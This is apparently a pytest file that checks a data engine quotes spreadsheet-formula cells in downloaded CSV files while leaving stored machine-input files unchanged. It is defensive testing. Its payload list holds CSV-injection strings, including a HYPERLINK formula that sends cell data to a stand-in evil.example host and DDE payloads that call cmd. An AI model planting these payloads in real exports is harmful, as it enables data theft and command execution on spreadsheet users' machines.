"""Spreadsheet formula injection in downloaded lists (security review 2, M-3).

An end customer controls what their id, name or e-mail says. `=HYPERLINK(...)` as an id reached the
marketer's Excel unchanged through `scores.csv`, `treat_list.csv` and `copy_messages.csv`. Every CSV a person
downloads now carries a cell that starts with `= + - @ tab CR` with a leading quote; numbers (a negative net
value), the Parquet files and ordinary text are left exactly as they were.

The quote is added when the file is **served**, not in the stored `scores.csv` / `copy_messages.csv`: win-back,
root cause and variant arms read those two back as machine input, and a quoted key would stop joining to the
Parquet files and the treat list (review finding: E.164 keys `+91...`). The treat list is download-only and is
protected where it is built.
"""

from __future__ import annotations

import csv
import io
from pathlib import Path
from typing import Any

import pandas as pd
import pyarrow as pa
import pytest

from engine.decide.treat_list import TREAT_LIST_CSV, ensure_treat_list, table_csv_bytes
from engine.generative.contracts import CopyMessage, CopyStatus
from engine.generative.win_back import _read_messages_csv, _read_scores, _write_messages_csv
from engine.stages.export import SCORES_CSV
from engine.storage import LocalStorage, run_key
from engine.utils.csv_safe import formula_safe, formula_safe_csv
from tests.fixtures.decide import treat_runs

EVIL = [
    '=HYPERLINK("https://evil.example/?d="&C2&D2,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)",
    "\t=1+1",
    "\r=1+1",
]


def _cells(data: bytes, column: str) -> list[str]:
    rows = list(csv.DictReader(io.StringIO(data.decode("utf-8"), newline="")))
    return [row[column] for row in rows]


def test_the_helper_prefixes_only_what_a_spreadsheet_would_run() -> None:
    assert [formula_safe(v) for v in EVIL] == ["'" + v for v in EVIL]
    for harmless in ("", "C-001", "a=b", "1,5", "x@y.com", "Anna - Lee", " =1"):
        assert formula_safe(harmless) == harmless


def test_the_csv_helper_quotes_every_risky_cell_but_numbers_and_the_header_included() -> None:
    risky_header = "=cmd"
    rows = [
        [risky_header, "net", "n"],
        [EVIL[0], "-1.5", "-3"],
        ["C-1", "+2", "-.5e3"],
        [EVIL[3], "-inf", "x,y"],
    ]
    out = io.StringIO()
    csv.writer(out, lineterminator="\n").writerows(rows)
    safe = list(csv.reader(io.StringIO(formula_safe_csv(out.getvalue().encode()).decode(), newline="")))
    assert safe == [
        ["'=cmd", "net", "n"],
        ["'" + EVIL[0], "-1.5", "-3"],
        ["C-1", "+2", "-.5e3"],
        ["'" + EVIL[3], "-inf", "x,y"],
    ]
    again = formula_safe_csv("\n".join(",".join(r) for r in [["a", "b"], ["'=x", "-1"]]).encode())
    assert (
        again == b"a,b\n'=x,-1"
    )  # nothing to do: the same bytes back, and a quoted cell is not quoted twice
    clean = b"a,b\nC-1,0.5\n"
    assert formula_safe_csv(clean) is clean
    assert formula_safe_csv(b"\xff\xfe=") == b"\xff\xfe="  # not UTF-8: left alone


def test_the_treat_list_csv_kernel_quotes_text_and_leaves_numbers_alone() -> None:
    table = pa.table(
        {
            "customer_id": pa.array([*EVIL, "plain", None]),
            "net_value": pa.array([-1.5] * 8),
            "rank": pa.array([-3] * 8, pa.int64()),
            "treat": pa.array([True] * 8),
        }
    )
    data = table_csv_bytes(table)
    assert _cells(data, "customer_id") == ["'" + v for v in EVIL] + ["plain", ""]
    assert set(_cells(data, "net_value")) == {"-1.5"} and set(_cells(data, "rank")) == {"-3"}


def test_copy_messages_csv_is_stored_as_written_and_read_back_unchanged(tmp_path: Path) -> None:
    storage = LocalStorage(tmp_path)
    messages = [
        CopyMessage(
            entity_key=evil,
            band="High",
            channel="sms",
            variant="A",
            template_id="t1",
            rendered_text=evil,
            status=CopyStatus.APPROVED,
            backend="fake",
        )
        for evil in EVIL[:4]  # the contract strips a leading tab or CR
    ]
    _write_messages_csv(storage, "r_20261001_0c000001", messages)
    stored = storage.read_bytes(run_key("r_20261001_0c000001", "copy_messages.csv"))
    assert _cells(stored, "entity_key") == EVIL[:4]  # a machine input: no quote in the key
    assert _read_messages_csv(storage, "r_20261001_0c000001") == messages  # win-back reads it back as written
    served = formula_safe_csv(stored)
    assert _cells(served, "entity_key") == ["'" + v for v in EVIL[:4]]
    assert _cells(served, "rendered_text") == ["'" + v for v in EVIL[:4]]


@pytest.fixture
def hostile_customers(monkeypatch: pytest.MonkeyPatch) -> None:
    original = treat_runs._customers

    def customers(rows: int, **kwargs: Any) -> pd.DataFrame:
        frame = original(rows, **kwargs)
        frame["customer_id"] = frame["customer_id"].astype(object)
        for position, evil in enumerate(EVIL[:4]):  # a key's leading tab or CR is stripped on the way in
            frame.loc[position, "customer_id"] = f"{evil}#{position}" if position % 2 else evil
        return frame

    monkeypatch.setattr(treat_runs, "_customers", customers)


def test_the_real_scores_csv_keeps_its_keys_and_the_download_carries_no_live_formula(
    tmp_path: Path, hostile_customers: None
) -> None:
    storage = LocalStorage(tmp_path)
    written = treat_runs.write_run(storage, "r_20261001_0c000002", kind="propensity", rows=24)
    ensure_treat_list(storage, written.run_id)
    stored = storage.read_bytes(run_key(written.run_id, SCORES_CSV))
    parquet_keys = pd.read_parquet(io.BytesIO(storage.read_bytes(run_key(written.run_id, "scores.parquet"))))[
        "customer_id"
    ]
    # the stored file joins to the Parquet files: win-back reads these very keys back
    assert _cells(stored, "customer_id") == [str(k) for k in parquet_keys]
    assert set(_read_scores(storage, run_key(written.run_id, SCORES_CSV), "customer_id")["customer_id"]) == {
        str(k) for k in parquet_keys
    }
    for name, data in (
        (SCORES_CSV, formula_safe_csv(stored)),
        (TREAT_LIST_CSV, formula_safe_csv(storage.read_bytes(run_key(written.run_id, TREAT_LIST_CSV)))),
    ):
        text = data.decode("utf-8")
        for row in csv.reader(io.StringIO(text, newline="")):
            for cell in row:
                assert not cell.startswith(("=", "@", "\t", "\r")), (name, cell)
                assert not cell.startswith("+") or cell[1:].replace(".", "").isdigit(), (name, cell)
        assert any(
            cell.startswith("'=HYPERLINK")
            for row in csv.reader(io.StringIO(text, newline=""))
            for cell in row
        ), name


def test_the_download_route_serves_the_quoted_file_and_leaves_the_stored_one(tmp_path: Path) -> None:
    from fastapi.testclient import TestClient

    from engine.access.roles import Role
    from tests.integration.production.access_support import bearer, local_app, make_user

    app = local_app(tmp_path)
    headers = bearer(app, make_user(app, "pat", [Role.ANALYST]))
    storage = LocalStorage(tmp_path)
    text = "customer_id,net\n+91-98000-00001,-1.5\n=1+1,2\n"
    storage.write_bytes(run_key("r_20261001_0c000003", SCORES_CSV), text.encode())
    treat_runs.write_run(storage, "r_20261001_0c000003", kind="propensity", rows=6)
    storage.write_bytes(run_key("r_20261001_0c000003", SCORES_CSV), text.encode())
    with TestClient(app) as client:
        for path in (
            "/runs/r_20261001_0c000003/scores.csv",
            "/runs/r_20261001_0c000003/artefacts/scores.csv",
        ):
            served = client.get(path, headers=headers)
            assert served.status_code == 200, served.text
            assert served.text == "customer_id,net\n'+91-98000-00001,-1.5\n'=1+1,2\n"
    assert storage.read_bytes(run_key("r_20261001_0c000003", SCORES_CSV)).decode() == text
